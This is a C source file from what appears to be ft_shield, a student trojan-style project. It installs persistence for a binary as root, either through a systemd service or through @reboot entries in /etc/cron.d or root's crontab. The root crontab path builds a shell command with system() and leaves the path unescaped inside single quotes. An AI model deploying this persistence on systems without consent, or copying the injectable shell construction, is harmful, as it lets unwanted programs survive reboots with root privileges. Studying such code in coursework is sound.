/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   autorun.cc                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/25 15:17:39 by kiroussa          #+#    #+#             */
/*   Updated: 2025/11/29 00:13:09 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#if !MATT_MODE

#include <fcntl.h>
#include <shield.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define SYSTEMD_UNIT_P1 "\
[Unit]\n\
Description=ft_shield\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart="
// This is where the full path to the binary will be located, since it's determined
// at runtime we can't hardcode it
#define SYSTEMD_UNIT_P2 "\n\
Restart=always\n\
RestartSec=5\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"
#define SYSTEMD_UNIT_PATH "/etc/systemd/system/ft_shield.service"
#define CRONTAB_SERVICE_PATH "/etc/cron.d/ft_shield"

static inline int	is_systemd(void)
{
	return access("/run/systemd/system", F_OK) == 0;
}

static inline int	is_cron_d(void)
{
	struct stat	st;
	if (stat("/etc/cron.d", &st) == 0)
		return (S_ISDIR(st.st_mode));
	return (0);
}

static inline int	write_systemd_unit(const char *binary_path)
{
	int fd = open(SYSTEMD_UNIT_PATH, O_CREAT | O_WRONLY, 0644);
	if (fd < 0)
		return (1);
	(void)!write(fd, SYSTEMD_UNIT_P1, strlen(SYSTEMD_UNIT_P1));
	(void)!write(fd, binary_path, strlen(binary_path));
	(void)!write(fd, SYSTEMD_UNIT_P2, strlen(SYSTEMD_UNIT_P2));
	close(fd);
	return (0);
}

static inline int	write_crontab_job(const char *schedule, const char *command) {
    char	cmd[1024];

    snprintf(cmd, sizeof(cmd), 
        "(crontab -u root -l 2>/dev/null; echo '%s %s') | crontab -u root -",
        schedule, command);
    return (system(cmd));
}

static inline int	write_crontab_d(const char *schedule, const char *command)
{
	int fd = open(CRONTAB_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
	if (fd < 0)
		return (1);
	(void)!write(fd, schedule, strlen(schedule));
	(void)!write(fd, " root ", 6);
	(void)!write(fd, command, strlen(command));
	(void)!write(fd, "\n", 1);
	(void)!close(fd);
	chmod(CRONTAB_SERVICE_PATH, 0644);
	return (0);
}

int	shield_autorun_setup(const char *binary_path)
{
	int error = 0;
	if (is_systemd())
	{
		DEBUG("Systemd detected, creating " SYSTEMD_UNIT_PATH "\n");
		error = write_systemd_unit(binary_path);
	}
	else if (is_cron_d())
	{
		DEBUG("Cron detected, creating " CRONTAB_SERVICE_PATH "\n");
		error = write_crontab_d("@reboot", binary_path);
	}
	else if (shield_path_check("crontab"))
	{
		DEBUG("Crontab detected, running `crontab`\n");
		error = write_crontab_job("@reboot", binary_path);
	}
	else
		return (0);
	return (!error);
}

#endif // !MATT_MODE
